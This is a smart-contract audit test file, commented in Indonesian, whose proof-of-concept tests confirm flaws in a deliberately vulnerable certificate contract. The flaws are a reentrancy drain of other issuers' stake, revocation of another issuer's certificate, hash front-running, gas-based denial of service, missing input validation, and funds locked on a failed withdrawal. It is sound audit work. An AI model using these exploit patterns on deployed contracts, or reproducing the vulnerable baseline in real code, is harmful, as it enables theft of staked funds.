// Proof-of-Concept eksploit terhadap baseline CertiChainV1 (vulnerable-by-design).
// Tes di berkas ini LULUS bila kerentanan TERBUKTI ada di V1. Retest perbaikan ada di CertiChain.test.js (V2).
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { ONE, h, REASON, Status } = require("./helpers");

async function v1Fixture() {
  const [admin, issuerA, issuerB, holder, victim] = await ethers.getSigners();
  const v1 = await ethers.deployContract("CertiChainV1", [admin.address]);
  for (const s of [issuerA, issuerB]) {
    await v1.connect(s).depositStake({ value: ONE });
    await v1.connect(admin).approveIssuer(s.address);
  }
  return { v1, admin, issuerA, issuerB, holder, victim };
}

describe("Audit PoC - eksploit pada CertiChainV1 (baseline)", function () {
  it("PoC-A-01 reentrancy menguras seluruh stake issuer lain (attacker setor 1 ETH, tarik 3 ETH)", async function () {
    const { v1 } = await loadFixture(v1Fixture); // V1 memegang 2 ETH milik issuer A & B
    const atk = await ethers.deployContract("ReentrancyAttacker", [await v1.getAddress()]);
    await atk.attack({ value: ONE });
    const atkBal = await ethers.provider.getBalance(await atk.getAddress());
    const v1Bal = await ethers.provider.getBalance(await v1.getAddress());
    console.log(`      [A-01] saldo attacker=${ethers.formatEther(atkBal)} ETH, saldo kontrak=${ethers.formatEther(v1Bal)} ETH, reentries=${await atk.reentries()}`);
    expect(atkBal).to.equal(3n * ONE);
    expect(v1Bal).to.equal(0n);
  });

  it("PoC-A-02 issuer B berhasil mencabut sertifikat milik issuer A", async function () {
    const { v1, issuerA, issuerB, holder } = await loadFixture(v1Fixture);
    const doc = h("ijazah-A");
    await v1.connect(issuerA).issueCertificate(doc, holder.address, 0);
    await v1.connect(issuerB).revokeCertificate(doc, REASON); // seharusnya ditolak
    expect((await v1.verifyCertificate(doc)).status).to.equal(Status.Revoked);
  });

  it("PoC-A-03 issuer B menyerobot (front-run) hash dokumen sehingga penerbitan issuer A gagal & holder salah", async function () {
    const { v1, issuerA, issuerB, holder, victim } = await loadFixture(v1Fixture);
    const doc = h("ijazah-target");
    await v1.connect(issuerB).issueCertificate(doc, victim.address, 0); // tx penyerang diurutkan lebih dulu
    await expect(v1.connect(issuerA).issueCertificate(doc, holder.address, 0)).to.be.revertedWithCustomError(v1, "AlreadyIssued");
    expect((await v1.verifyCertificate(doc)).holder).to.equal(victim.address);
  });

  it("PoC-A-04 gas revokeAllForHolder tumbuh linear tanpa batas (risiko DoS pada block gas limit)", async function () {
    const { v1, admin, issuerA } = await loadFixture(v1Fixture);
    const signers = await ethers.getSigners();
    const gasFor = async (holderAddr, n, tag) => {
      for (let i = 0; i < n; i++) await v1.connect(issuerA).issueCertificate(h(tag + i), holderAddr, 0);
      const tx = await v1.connect(admin).revokeAllForHolder(holderAddr, REASON);
      return (await tx.wait()).gasUsed;
    };
    const g10 = await gasFor(signers[10].address, 10, "s");
    const g200 = await gasFor(signers[11].address, 200, "L");
    const perItem = (g200 - g10) / 190n;
    const limit = 30_000_000n;
    console.log(`      [A-04] gas(10)=${g10}, gas(200)=${g200}, gas/sertifikat≈${perItem}, batas blok 30M ≈ ${limit / perItem} sertifikat per holder`);
    expect(g200).to.be.gt(g10 * 10n);
  });

  it("PoC-A-05 V1 menerima holder=address(0), hash=0, dan expiry di masa lalu", async function () {
    const { v1, issuerA } = await loadFixture(v1Fixture);
    await v1.connect(issuerA).issueCertificate(ethers.ZeroHash, ethers.ZeroAddress, 1); // semua tidak valid
    const v = await v1.verifyCertificate(ethers.ZeroHash);
    expect(v.holder).to.equal(ethers.ZeroAddress);
    expect(v.status).to.equal(Status.Expired); // expiresAt=1 (1970) -> langsung kedaluwarsa, tetap tercatat
  });

  it("PoC-A-07 penarikan ke kontrak yang menolak ETH: stake terhapus, dana terkunci permanen", async function () {
    const { v1 } = await loadFixture(v1Fixture);
    const rr = await ethers.deployContract("RejectingReceiver");
    await rr.deposit(await v1.getAddress(), { value: ONE });
    await rr.withdraw(await v1.getAddress()); // tidak revert!
    expect(await v1.stakeOf(await rr.getAddress())).to.equal(0n);
    expect(await ethers.provider.getBalance(await v1.getAddress())).to.equal(3n * ONE); // 1 ETH rr "hilang" di kontrak
  });
});
